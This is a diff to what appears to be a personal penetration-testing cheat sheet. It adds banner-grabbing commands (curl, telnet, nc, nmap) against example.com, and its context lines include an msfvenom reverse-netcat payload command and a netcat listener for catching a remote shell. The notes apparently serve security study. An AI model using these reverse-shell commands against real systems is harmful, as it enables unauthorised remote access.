@@ -31,7 +31,16 @@ sudo su                         # Switch to root
 find / -name file.txt         # Locate file or find . -name file.text
 or find / -name file.txt 2>/dev/null
 cat file.txt            # Read
-banner grabing
+#banner grabing
+-curl -I https://example.com
+-telnet example.com 80
+-nc example.com 80
+  and the type HEAD / HTTP/1.1
+               Host: example.com
+-nmap -sV example.com -p 80,443
+-
+
+
 -telnet 192.168.0.1
 -msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 
 start listen nc -lnvp 444
